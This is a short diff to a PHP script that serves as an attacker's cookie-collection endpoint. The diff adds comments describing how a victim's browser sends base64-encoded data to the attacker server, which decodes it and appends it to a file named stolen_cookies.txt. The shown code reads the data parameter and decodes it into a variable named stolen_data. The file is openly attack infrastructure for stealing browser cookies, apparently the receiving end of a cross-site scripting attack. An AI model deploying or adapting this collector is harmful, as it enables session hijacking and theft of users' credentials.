@@ -1,5 +1,11 @@
 <?php
 // Data collection logic
+// How it works:
+// 1. The victim's browser sends a request to the attacker server with the data
+// 2. The attacker server receives the request and decodes the data
+// 3. The attacker server appends the data to the stolen_cookies.txt file
+// 4. The attacker server returns a success page to the victim (happens from line 18)
+
 date_default_timezone_set('Asia/Jerusalem');
 if (isset($_GET['data'])) {
     $stolen_data = base64_decode($_GET['data']);
